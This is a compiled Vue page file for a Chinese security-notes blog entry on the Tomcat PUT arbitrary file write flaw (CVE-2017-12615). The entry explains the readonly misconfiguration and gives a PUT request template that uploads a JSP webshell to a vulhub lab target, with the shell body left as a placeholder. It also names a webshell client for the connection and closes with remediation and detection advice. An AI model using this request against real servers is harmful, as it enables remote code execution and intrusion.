import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as l,a as t,b as r,d as o,e as p,r as i,o as s}from"./app-BLgHyi2a.js";const c="/DailyNotes/assets/02-BiEme_0D.png",d="/DailyNotes/assets/01-Y7Mu1XWm.png",m={},h={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"};function g(u,e){const a=i("ExternalLinkIcon");return s(),l("div",null,[e[1]||(e[1]=t("h1",{id:"漏洞名称-tomcat-put-方法任意写文件漏洞",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#漏洞名称-tomcat-put-方法任意写文件漏洞"},[t("span",null,"漏洞名称：Tomcat PUT 方法任意写文件漏洞")])],-1)),e[2]||(e[2]=t("hr",null,null,-1)),e[3]||(e[3]=t("h2",{id:"漏洞介绍",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#漏洞介绍"},[t("span",null,"漏洞介绍")])],-1)),t("blockquote",null,[t("p",null,[t("a",h,[e[0]||(e[0]=o("国家信息安全漏洞库 (cnnvd.org.cn)",-1)),p(a)])])]),e[4]||(e[4]=r(`<hr><p>Apache Tomcat 是美国阿帕奇（Apache）软件基金会下属的 Jakarta 项目的一款轻量级 Web 应用服务器，它主要用于开发和调试 JSP 程序，适用于中小型系统。部分版本的 Tomcat 启用 HTTP PUT 请求方法时，远程攻击者可以构造恶意请求利用该漏洞向服务器上传包含任意代码执行的 jsp 文件，并被服务器执行该文件，导致攻击者可以执行任意代码。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>攻击者有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，之后 JSP 文件中的代码将能被服务器执行。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><p>7.0.0&lt;=Version &lt;=7.0.79</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h2><p>Tomcat 的 Servlet 是在 conf/web.xml 配置的，通过配置文件可知，漏洞本质 Tomcat 配置了可写（readonly=false），导致我们可以往服务器写文件：</p><pre><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre><p>当后缀名为 .jsp 和 .jspx 的时候，是通过 JspServlet 处理请求的。例如<code>1.jsp </code>（末尾有一个空格）并不能匹配到 JSP Servlet，而是会交由 default Servlet 去处理。</p><pre><code>&lt;!-- The mapping for the default servlet --&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;

    &lt;!-- The mappings for the JSP servlet --&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;
        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
</code></pre><p>虽然 Tomcat 对文件后缀有一定检测（不能直接写 jsp），但我们使用一些文件系统的特性（如 Linux 下可用<code>/</code>）来绕过了限制。</p><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><p>vulhub/tomcat/CVE-2017-12615</p><hr><h3 id="利用方式-1" tabindex="-1"><a class="header-anchor" href="#利用方式-1"><span>利用方式 1</span></a></h3><p>使用 PUT 请求发送以下内容：</p><pre><code>PUT /1.jsp/ HTTP/1.1
Host: 192.168.1.189:8090
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 958

--jsp shell--
</code></pre><figure><img src="`+c+'" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>然后利用蚁剑进行连接：</p><figure><img src="'+d+'" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><h3 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h3><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><hr><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议"><span>用户处置建议</span></a></h3><p>将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true</p><hr><h3 id="安全产品检测建议" tabindex="-1"><a class="header-anchor" href="#安全产品检测建议"><span>安全产品检测建议</span></a></h3><p>检测 PUT 形式发送后缀名为 jsp 的请求</p><p>检测 jsp 格式的木马</p>',35))])}const f=n(m,[["render",g]]),b=JSON.parse('{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2017-12615.html","title":"漏洞名称：Tomcat PUT 方法任意写文件漏洞","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"漏洞分析","description":"漏洞名称：Tomcat PUT 方法任意写文件漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Apache Tomcat 是美国阿帕奇（Apache）软件基金会下属的 Jakarta 项目的一款轻量级 Web 应用服务器，它主要用于开发和调试 JSP 程序，适用于中小型系统。部分版本的 Tomcat 启用 HTTP PUT 请求方法时...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2017-12615.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"漏洞名称：Tomcat PUT 方法任意写文件漏洞"}],["meta",{"property":"og:description","content":"漏洞名称：Tomcat PUT 方法任意写文件漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Apache Tomcat 是美国阿帕奇（Apache）软件基金会下属的 Jakarta 项目的一款轻量级 Web 应用服务器，它主要用于开发和调试 JSP 程序，适用于中小型系统。部分版本的 Tomcat 启用 HTTP PUT 请求方法时..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"漏洞分析"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"漏洞名称：Tomcat PUT 方法任意写文件漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方式 1","slug":"利用方式-1","link":"#利用方式-1","children":[]},{"level":3,"title":"","slug":"","link":"#","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[{"level":3,"title":"用户处置建议","slug":"用户处置建议","link":"#用户处置建议","children":[]},{"level":3,"title":"安全产品检测建议","slug":"安全产品检测建议","link":"#安全产品检测建议","children":[]}]}],"git":{"createdTime":1731665131000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":3}]},"readingTime":{"minutes":2.03,"words":608},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/Tomcat/tomcat_CVE-2017-12615.md","localizedDate":"2024年11月15日","excerpt":"\\n","autoDesc":true}');export{f as comp,b as data};
